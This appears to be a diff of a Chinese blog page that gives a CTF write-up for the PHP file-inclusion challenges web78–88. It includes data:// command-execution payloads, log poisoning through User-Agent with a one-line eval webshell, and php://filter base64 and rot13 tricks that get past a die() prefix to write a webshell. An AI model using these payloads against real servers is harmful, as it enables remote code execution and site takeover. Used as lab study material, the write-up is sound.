@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="web78开启容器 人畜无害的前端  伪协议data协议可以命令执行 &#x2F;?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain&#x2F;,&lt;?php system(&quot;tac &#x2F;f*&quot;);?&gt; &#x2F;?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php%20system(&#39;ls&#39;);?&gt; &#x2F;?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php">
+    <meta name="description" content="web78开启容器 人畜无害的前端  伪协议data 协议可以命令执行 &#x2F;?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain&#x2F;,&lt;?php system(&quot;tac &#x2F;f*&quot;);?&gt; &#x2F;?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php%20system(&#39;ls&#39;);?&gt; &#x2F;?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?ph">
 <meta property="og:type" content="article">
 <meta property="og:title" content="web78-88">
 <meta property="og:url" content="https://youngking-gfy.github.io/2025/03/14/web78-88/index.html">
 <meta property="og:site_name" content="Youngking&#39;s Blog">
-<meta property="og:description" content="web78开启容器 人畜无害的前端  伪协议data协议可以命令执行 &#x2F;?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain&#x2F;,&lt;?php system(&quot;tac &#x2F;f*&quot;);?&gt; &#x2F;?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php%20system(&#39;ls&#39;);?&gt; &#x2F;?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php">
+<meta property="og:description" content="web78开启容器 人畜无害的前端  伪协议data 协议可以命令执行 &#x2F;?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain&#x2F;,&lt;?php system(&quot;tac &#x2F;f*&quot;);?&gt; &#x2F;?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php%20system(&#39;ls&#39;);?&gt; &#x2F;?file&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?ph">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/14/web78-88/file-20250314150658818.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/14/web78-88/file-20250314150906567.png">
@@ -46,7 +46,7 @@
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/14/web78-88/file-20250316012454616.png">
 <meta property="og:image" content="https://youngking-gfy.github.io/2025/03/14/web78-88/file-20250316012917464.png">
 <meta property="article:published_time" content="2025-03-14T07:02:00.000Z">
-<meta property="article:modified_time" content="2025-03-15T17:29:23.894Z">
+<meta property="article:modified_time" content="2025-03-17T07:54:44.735Z">
 <meta property="article:author" content="Y0ungK1ng">
 <meta property="article:tag" content="文件包含">
 <meta name="twitter:card" content="summary">
@@ -205,7 +205,7 @@
     <h3 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h3><p>开启容器</p>
 <p>人畜无害的前端</p>
 <p><img src="/2025/03/14/web78-88/file-20250314150658818.png"></p>
-<p>伪协议<br>data协议可以命令执行</p>
+<p>伪协议<br>data 协议可以命令执行</p>
 <p><code>/?file=data://text/plain/,&lt;?php system(&quot;tac /f*&quot;);?&gt;</code><br><img src="/2025/03/14/web78-88/file-20250314150906567.png"></p>
 <p><code>/?file=data://text/plain,&lt;?php%20system(&#39;ls&#39;);?&gt;</code></p>
 <p><code>/?file=data://text/plain,&lt;?php%20system(&#39;tac flag.php&#39;);?&gt;</code></p>
@@ -220,7 +220,6 @@
 <p>这里罗列下<code>php短标签</code></p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;<span class="meta">?&gt;</span>  <span class="comment">#前提是开启配置参数short_open_tags=on</span></span><br><span class="line"><span class="meta">&lt;?=</span>(表达式)<span class="meta">?&gt;</span>  等价于 <span class="meta">&lt;?php</span> <span class="keyword">echo</span> (表达式)<span class="meta">?&gt;</span>  <span class="comment">#不需要开启参数设置</span></span><br><span class="line">&lt;% <span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>;%&gt;   <span class="comment">#开启配置参数asp_tags=on，并且只能在7.0以下版本使用</span></span><br><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">echo</span> <span class="string">&#x27;123&#x27;</span>; &lt;/script&gt; <span class="comment">#不需要修改参数开关，但是只能在7.0以下可用。</span></span><br></pre></td></tr></table></figure>
 
-
 <p>这里还可以用<br><code>/?file=data:text/plain,&lt;?pHp system(&#39;tac fla*&#39;);?&gt;</code><br><img src="/2025/03/14/web78-88/file-20250314152025336.png"></p>
 <h3 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h3><p>开启容器</p>
 <p><img src="/2025/03/14/web78-88/file-20250314152556066.png"></p>
@@ -233,14 +232,14 @@
 
 <p><img src="/2025/03/14/web78-88/file-20250314153023943.png"></p>
 <p><img src="/2025/03/14/web78-88/file-20250314153109119.png"></p>
-<p>得到flag</p>
-<p>官方wp用日志</p>
+<p>得到 flag</p>
+<p>官方 wp 用日志</p>
 <p><code>/?file=/var/log/nginx/access.log</code><br><img src="/2025/03/14/web78-88/file-20250314153418102.png"></p>
-<p>可以用User-Agent注入一句话木马</p>
+<p>可以用 User-Agent 注入一句话木马</p>
 <p><code>&lt;?php @eval($_POST[&#39;attack&#39;]);?&gt;</code></p>
 <p><img src="/2025/03/14/web78-88/file-20250314153742344.png"></p>
 <p><img src="/2025/03/14/web78-88/file-20250314153751690.png"></p>
-<p>得到flag</p>
+<p>得到 flag</p>
 <h3 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h3><p>开启容器</p>
 <p><code>php</code>、<code>data</code>、<code>:</code>被过滤</p>
 <p><img src="/2025/03/14/web78-88/file-20250314154013559.png"></p>
@@ -263,11 +262,11 @@
 <p><img src="/2025/03/14/web78-88/file-20250314155321220.png"><br>加了两个函数：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">session_unset()：</span><br><span class="line">释放当前在内存中已经创建的所有<span class="variable">$_SESSION</span>变量，但不删除session文件。</span><br><span class="line"></span><br><span class="line">session_destroy()：</span><br><span class="line">删除当前用户对应的session文件以及释放sessionid。</span><br></pre></td></tr></table></figure>
 
-<p>但条件竞争使用的是上传那一瞬间创建的 session，所以不影响。</p>
+<p>但条件竞争使用的是上传那一瞬间创建的  session，所以不影响。</p>
 <p>依旧使用 web82 的脚本</p>
 <p><img src="/2025/03/14/web78-88/file-20250314155416489.png"></p>
 <h3 id="web84"><a href="#web84" class="headerlink" title="web84"></a>web84</h3><p>开启容器</p>
-<p><code>system(rm -rf /tmp/*);</code><br>因为 <code>session.upload_progress.cleanup = on</code> 会清空对应 session 文件中的内容，所以加上删除对竞争的影响不大。</p>
+<p><code>system(rm -rf /tmp/*);</code><br>因为  <code>session.upload_progress.cleanup = on</code>  会清空对应 session 文件中的内容，所以加上删除对竞争的影响不大。</p>
 <p>依旧使用 web82 的脚本。</p>
 <p><img src="/2025/03/14/web78-88/file-20250314155525362.png"></p>
 <p><img src="/2025/03/14/web78-88/file-20250314155622378.png"></p>
@@ -285,28 +284,28 @@
 <p>web82 脚本里用的是完整路径，不影响竞争。</p>
 <p>继续用脚本</p>
 <h3 id="web87"><a href="#web87" class="headerlink" title="web87"></a>web87</h3><p><img src="/2025/03/14/web78-88/file-20250316005611277.png"></p>
-<p>除了关键词的过滤，新增 file_put_contents 函数，将会往 $file 里写入 <code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt; </code>和我们 post 传入的 $content 内容。</p>
-<p>由于 $content 参数可控，因此我们可以写入恶意的php 代码或者一句话木马，但是 <code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code> 这段 PHP 代码它会立即终止脚本执行并输出消息 “大佬别秀了”，因此我们还需要绕过这个 die() 函数。</p>
-<p>绕过死亡die</p>
-<p>题目中 $content 被加上了 <code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt; </code>，我们可以使用 <code>php://filter/write=convert.base64-decode</code> 先对其进行解码，在解码过程中，字符 &lt;、?、空格、(、’、)、;、&gt;，这些字符不符合 base64 编码的字符范围都将先被移除，最终剩下的用于解码的字符只有 phpdie 和我们 post 传入的内容。</p>
+<p>除了关键词的过滤，新增  file_put_contents  函数，将会往 $file 里写入  <code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt; </code>和我们 post 传入的 $content 内容。</p>
+<p>由于 $content 参数可控，因此我们可以写入恶意的 php 代码或者一句话木马，但是  <code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code> 这段 PHP 代码它会立即终止脚本执行并输出消息 “大佬别秀了”，因此我们还需要绕过这个  die() 函数。</p>
+<p>绕过死亡 die</p>
+<p>题目中  $content 被加上了 <code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt; </code>，我们可以使用 <code>php://filter/write=convert.base64-decode</code> 先对其进行解码，在解码过程中，字符 &lt;、?、空格、(、’、)、;、&gt;，这些字符不符合 base64 编码的字符范围都将先被移除，最终剩下的用于解码的字符只有 phpdie 和我们 post 传入的内容。</p>
 <p><code>php://filter/write=convert.base64-decode/resource=1.php</code></p>
-<p>因为对上面这段代码进行两次url编码，编码后，得到的结果如下</p>
+<p>因为对上面这段代码进行两次 url 编码，编码后，得到的结果如下</p>
 <p><code>/?file=%25%37%30%25%36%38%25%37%30%25%33%61%25%32%66%25%32%66%25%36%36%25%36%39%25%36%63%25%37%34%25%36%35%25%37%32%25%32%66%25%37%37%25%37%32%25%36%39%25%37%34%25%36%35%25%33%64%25%36%33%25%36%66%25%36%65%25%37%36%25%36%35%25%37%32%25%37%34%25%32%65%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34%25%32%64%25%36%34%25%36%35%25%36%33%25%36%66%25%36%34%25%36%35%25%32%66%25%37%32%25%36%35%25%37%33%25%36%66%25%37%35%25%37%32%25%36%33%25%36%35%25%33%64%25%33%31%25%32%65%25%37%30%25%36%38%25%37%30</code></p>
 <p>对所有字符进行编码</p>
-<p>同时，用post进行传参content</p>
+<p>同时，用 post 进行传参 content</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;hack&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>然后对content内容进行base64加密</p>
+<p>然后对 content 内容进行 base64 加密</p>
 <blockquote>
-<p>由于 Base64 解码是以 4 个字符为一组进行的，这里移除后只剩下 6 个字符，因此我们随便加两个合法字符补全，让其 base64 解码成功，后面再继续传入经过 base64 编码的 payload，也可以被正常解码。</p>
+<p>由于  Base64 解码是以 4 个字符为一组进行的，这里移除后只剩下 6 个字符，因此我们随便加两个合法字符补全，让其 base64 解码成功，后面再继续传入经过 base64 编码的  payload，也可以被正常解码。</p>
 </blockquote>
 <p>太细了！！</p>
 <p><img src="/2025/03/14/web78-88/file-20250316011259950.png"></p>
 <p>木马注入</p>
 <p><img src="/2025/03/14/web78-88/file-20250316011326134.png"></p>
 <p><img src="/2025/03/14/web78-88/file-20250316011348495.png"></p>
-<p>第二种解法，针对绕过死亡die，可以直接使用rot</p>
-<p>这里编码采取凯撒13来操作（rot13再操作一次为本身）<br>使得不会被认定为php代码，绕过死亡die</p>
+<p>第二种解法，针对绕过死亡 die，可以直接使用 rot</p>
+<p>这里编码采取凯撒 13 来操作（rot13 再操作一次为本身）<br>使得不会被认定为 php 代码，绕过死亡 die</p>
 <p><code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code> 经过 rot13 编码会变成<code> &lt;?cuc qrv(); ?&gt;</code>，如果 php 未开启短标签，则不会认识这段代码，也就不会执行。</p>
 <p>file 传入 <code>php://filter/write=string.rot13/resource=sh.php</code></p>
 <p>两次 url 编码：</p>
